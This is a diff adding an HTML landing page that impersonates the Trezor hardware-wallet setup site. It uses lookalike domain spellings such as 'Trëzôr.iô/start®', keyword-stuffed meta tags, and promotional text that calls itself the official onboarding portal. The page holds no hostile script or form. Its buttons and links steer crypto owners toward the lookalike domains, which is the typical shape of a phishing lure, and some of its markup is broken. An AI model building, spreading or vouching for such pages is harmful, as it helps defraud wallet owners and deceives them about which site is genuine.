@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+   <title>Trëzôr.iô/start®® - Starting Up Your Device - Trëzôr®</title>
+    <meta name="description"
+        content="Visit Trëzôr.iô/start® to easily manage, trade, and receive crypto. Get price alerts and full control with top-tier security and ease of use.">
+    <meta name="keywords" content="Trëzôr bridge, Trëzôr wallet, what is bridge, login">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Manage your crypto securely in Trëzôr Suite. Send, receive, trade, and track your coins with Trëzôr Hardwarë wallet.">
+    <link rel="icon" type="image/png" href="https://Trëzôr.io/static/favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+/* --- Begin CSS from paste-2.txt and custom banner style --- */
+:root {
+    --primary-color: #00875A;
+    --secondary-color: #004D40;
+    --text-color: #333333;
+    --light-text: #666666;
+    --white: #ffffff;
+    --background: #f5f5f5;
+    --transition: all 0.3s ease;
+    --container-width: 1200px;
+    --banner-green: #28a745;
+}
+
+body {
+    font-family: 'Inter', sans-serif;
+    line-height: 1.6;
+    color: var(--text-color);
+    background: var(--background);
+    margin: 0;
+}
+
+.container {
+    max-width: var(--container-width);
+    margin: 0 auto;
+    padding: 0 1rem;
+}
+
+/* Banner */
+.banner {
+    background: var(--banner-green);
+    color: #fff;
+    width: 100%;
+    padding: 0;
+    margin: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 70px;
+    position: relative;
+    overflow: hidden;
+}
+.banner-inner {
+    display: flex;
+    align-items: center;
+    width: 100%;
+    max-width: 1400px;
+    padding: 0 2rem;
+    justify-content: space-between;
+}
+.banner-line {
+    flex: 1 1 auto;
+    display: flex;
+    align-items: center;
+    font-size: 1.25rem;
+    font-weight: 500;
+    letter-spacing: 0.5px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+.banner-logo {
+    display: flex;
+    align-items: center;
+    font-weight: 700;
+    font-size: 1.3rem;
+    margin-right: 1.5rem;
+    gap: 0.5em;
+}
+.banner-logo i {
+    font-size: 1.5rem;
+}
+.banner-buttons {
+    display: flex;
+    gap: 0.8rem;
+    margin-left: 2rem;
+}
+.banner-btn {
+    background: #fff;
+    color: var(--banner-green);
+    border: none;
+    padding: 10px 26px;
+    border-radius: 22px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    text-decoration: none;
+    transition: background 0.2s, color 0.2s;
+    box-shadow: 0 2px 8px rgba(40,167,69,0.08);
+    display: inline-block;
+}
+.banner-btn:hover {
+    background: #e6f4ea;
+    color: #155724;
+}
+@media (max-width: 900px) {
+    .banner-inner {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 0.8rem;
+        padding: 1rem;
+    }
+    .banner-line {
+        white-space: normal;
+        font-size: 1.08rem;
+    }
+    .banner-buttons {
+        margin-left: 0;
+        gap: 0.6rem;
+    }
+}
+
+/* Hero Section */
+.hero {
+    padding: 60px 0 60px;
+    background: linear-gradient(135deg, #f5f5f5 0%, #e0e0e0 100%);
+    min-height: 480px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.hero-container {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 3rem;
+    align-items: center;
+    width: 100%;
+    max-width: 1200px;
+}
+.hero-content {
+    animation: fadeInLeft 1s ease;
+}
+.hero-title {
+    font-size: 2.8rem;
+    line-height: 1.13;
+    margin-bottom: 1.4rem;
+    color: var(--text-color);
+    font-weight: 600;
+    letter-spacing: -1px;
+}
+.hero-features {
+    margin-bottom: 2.3rem;
+}
+.hero-features ul {
+    list-style: none;
+    padding: 0;
+}
+.hero-features li {
+    font-size: 1.09rem;
+    margin-bottom: 1.1rem;
+    display: flex;
+    align-items: center;
+    color: var(--text-color);
+}
+.hero-features li i {
+    color: var(--primary-color);
+    margin-right: 0.7em;
+    font-size: 1.18em;
+    width: 1.6em;
+    text-align: center;
+}
+.hero-buttons {
+    display: flex;
+    gap: 1rem;
+}
+.button-green {
+    background-color: var(--banner-green);
+    color: #fff;
+    padding: 0.95rem 2.2rem;
+    border: none;
+    border-radius: 24px;
+    font-weight: 600;
+    font-size: 1.1rem;
+    text-decoration: none;
+    transition: background 0.18s, transform 0.18s;
+    box-shadow: 0 2px 8px rgba(40,167,69,0.08);
+    cursor: pointer;
+    display: inline-block;
+}
+.button-green:hover {
+    background-color: #218838;
+    transform: translateY(-2px);
+}
+.hero-image {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    animation: fadeInRight 1s ease;
+}
+.hero-image img {
+    width: 100%;
+    max-width: 480px;
+    height: auto;
+    border-radius: 14px;
+    box-shadow: 0 4px 32px rgba(44,62,80,0.09);
+    background: #fff;
+}
+@keyframes fadeInLeft {
+    from { opacity: 0; transform: translateX(-50px);}
+    to { opacity: 1; transform: translateX(0);}
+}
+@keyframes fadeInRight {
+    from { opacity: 0; transform: translateX(50px);}
+    to { opacity: 1; transform: translateX(0);}
+}
+@media screen and (max-width: 968px) {
+    .hero-container {
+        grid-template-columns: 1fr;
+        text-align: center;
+        gap: 2.5rem;
+    }
+    .hero-image {
+        justify-content: center;
+        margin-top: 1.5rem;
+    }
+    .hero-title {
+        font-size: 2.1rem;
+    }
+    .hero-features li {
+        justify-content: center;
+    }
+}
+@media screen and (max-width: 600px) {
+    .hero {
+        padding: 30px 0 30px;
+    }
+    .hero-title {
+        font-size: 1.4rem;
+    }
+    .hero-image img {
+        max-width: 98vw;
+    }
+}
+/* Content Section */
+.content-section {
+    max-width: 900px;
+    margin: 40px auto 40px auto;
+    background: #fff;
+    border-radius: 16px;
+    box-shadow: 0 8px 32px rgba(44, 62, 80, 0.06);
+    padding: 40px 35px 30px 35px;
+}
+.content-section h2 {
+    color: var(--banner-green);
+    margin-top: 0;
+    font-size: 2rem;
+}
+.content-section ul {
+    margin-left: 1.2em;
+}
+.content-section a {
+    color: var(--primary-color);
+    text-decoration: underline;
+    word-break: break-all;
+}
+@media (max-width: 600px) {
+    .content-section {
+        padding: 18px 8px 16px 8px;
+    }
+}
+/* --- End CSS --- */
+    </style>
+</head>
+<body>
+    <!-- Banner with long line, logo, and buttons -->
+    <div class="banner">
+        <div class="banner-inner">
+            <span class="banner-logo">
+                <i class="fas fa-wallet"></i> Trëzôr
+            </span>
+            <span class="banner-line">
+                Secure your crypto journey with <b>Trëzôr</b> and get started at <a href="https://Trëzôr.iô/start®" style="color:#fff; text-decoration:underline; font-weight:500;" target="_blank">Trëzôr.iô/start®</a>
+            </span>
+            <div class="banner-buttons">
+                <a href="https://Trëzôr.iô/start®" target="_blank" class="banner-btn">Get Started</a>
+                <a href="https://suite.Trëzôr.io/web/" target="_blank" class="banner-btn">Open Trëzôr Suite</a>
+                <a href="https://Trëzôr.io/" target="_blank" class="banner-btn">Official Site</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-container container">
+            <div class="hero-content">
+                <h1 class="hero-title">
+                    The app made
+for your Trëzôr
+                </h1>
+                <div class="hero-features">
+                    <ul>
+                        <li><i class="fas fa-exchange-alt"></i> Send, receive, trade &amp; track your coins</li>
+                        <li><i class="fas fa-chart-line"></i> Track your portfolio balance</li>
+                        <li><i class="fas fa-check-circle"></i> Confirm every transaction directly on your wallet</li>
+                    </ul>
+                </div>
+                <div class="hero-buttons">
+                    <a href="https://suite.Trëzôr.io/web/" target="_blank" class="button-green">Discover the app</a>
+                </div>
+            </div>
+            <div class="hero-image">
+
+        </div>
+    </section>
+
+    <!-- 800-word Content Section about Trëzôr.iô/start® -->
+    <section class="content-section">
+        <h2>Getting Started with Trëzôr.iô/start®: Your Path to Secure Crypto Management</h2>
+        <p>
+            In the ever-evolving world of cryptocurrency, security and simplicity are essential. <strong>Trëzôr Hardwarë wallet</strong> and the Trëzôr Suite platform provide both, empowering users to take full control of their digital assets. If you’re new to Hardwarë wallets or seeking a more secure way to manage your coins, <a href="https://Trëzôr.iô/start®" target="_blank">Trëzôr.iô/start®</a> is your essential first step.
+        </p>
+        <h2>What is Trëzôr.iô/start®?</h2>
+        <p>
+            <strong>Trëzôr.iô/start®</strong> is the official onboarding portal for Trëzôr Hardwarë wallets. Whether you own a Trëzôr Model One or Model T, this site guides you through every stage of setup, ensuring your wallet is initialized securely and correctly. The process is beginner-friendly, with clear instructions, helpful visuals, and security tips at each step. By following the steps at Trëzôr.iô/start®, you can be confident that your device is genuine, your recovery seed is safely generated offline, and your wallet is ready for use with <strong>Trëzôr Suite</strong>.
+        </p>
+        <h2>How to Set Up Your Trëzôr Hardwarë wallet Using Trëzôr.iô/start®</h2>
+        <ul>
+            <li>
+                <strong>Unbox and Connect:</strong> After unboxing your Trëzôr Hardwarë wallet, visit <a href="https://Trëzôr.iô/start®" target="_blank">Trëzôr.iô/start®</a> on your computer. Connect your device via USB and follow the on-screen prompts.
+            </li>
+            <li>
+                <strong>Install Trëzôr Suite:</strong> Trëzôr.iô/start® will prompt you to download and install <strong>Trëzôr Suite</strong>, the all-in-one app for managing your crypto. Trëzôr Suite is available for Windows, macOS, Linux, and as a web app.
+            </li>
+            <li>
+                <strong>Initialize Your Device:</strong> You’ll be guided to create a new wallet or recover an existing one. This includes generating your unique recovery seed-a list of 12 or 24 words that act as your backup. Write these down and keep them offline and secure.
+            </li>
+            <li>
+                <strong>Set a PIN:</strong> For extra security, set a PIN on your Trëzôr Hardwarë wallet. This ensures that even if your device is lost, no one can access your assets without your PIN.
+            </li>
+            <li>
+                <strong>Start Using Trëzôr Suite:</strong> Once setup is complete, open Trëzôr Suite and connect your device. You can now send, receive, trade, and track your coins with confidence.
+            </li>
+        </ul>
+        <h2>Why Use Trëzôr Suite with Your Trëzôr Hardwarë wallet?</h2>
+        <p>
+            <strong>Trëzôr Suite</strong> is the official app for managing your cryptocurrency with a Trëzôr Hardwarë wallet. It provides an intuitive dashboard to view your portfolio, send and receive coins, swap assets, and monitor price changes. All sensitive operations are confirmed on your Hardwarë wallet, ensuring your private keys never leave the device. This air-gapped security model is the gold standard for crypto self-custody.
+        </p>
+        <h2>Benefits of Trëzôr.iô/start® and Trëzôr Suite</h2>
+        <ul>
+            <li>
+                <strong>Maximum Security:</strong> Your private keys are generated and stored securely on the Trëzôr Hardwarë wallet. Transactions can only be approved physically on the device, protecting you from malware and phishing.
+            </li>
+            <li>
+                <strong>Privacy and Transparency:</strong> Trëzôr Suite is open-source and privacy-focused. You can connect via Tor, use discreet mode, and manage your coins without exposing sensitive data.
+            </li>
+            <li>
+                <strong>All-in-One Management:</strong> With Trëzôr Suite, you can manage Bitcoin, Ethereum, and thousands of other coins and tokens in one place.
+            </li>
+            <li>
+                <strong>Easy Recovery:</strong> If your device is lost or damaged, you can recover your wallet using the recovery seed you generated at Trëzôr.iô/start®.
+            </li>
+            <li>
+                <strong>Continuous Updates:</strong> Trëzôr Suite and firmware updates are delivered regularly, adding new features, coins, and security enhancements.
+            </li>
+        </ul>
+        <h2>Advantages of Using Trëzôr.iô/start®</h2>
+        <p>
+            <strong>Trëzôr.iô/start®</strong> ensures that every user begins their crypto journey safely. The site verifies your device’s authenticity, provides anti-phishing tips, and helps you avoid common mistakes. By following the official setup, you minimize risk and maximize peace of mind.
+        </p>
+        <h2>Start Your Crypto Journey Today</h2>
+        <p>
+            Whether you’re new to crypto or a seasoned investor, <strong>Trëzôr Hardwarë wallet</strong> and <strong>Trëzôr Suite</strong> offer the best combination of security, convenience, and control. Visit <a href="https://Trëzôr.iô/start®" target="_blank">Trëzôr.iô/start®</a> to begin, and join millions of users who trust Trëzôr to safeguard their digital assets.
+        </p>
+        <p>
+            <em>Remember: Your recovery seed is your ultimate backup. Never share it online, and always keep it in a safe place. With Trëzôr, you are your own bank-secure, private, and in full control.</em>
+        </p>
+    </section>
+</body>
+</html>
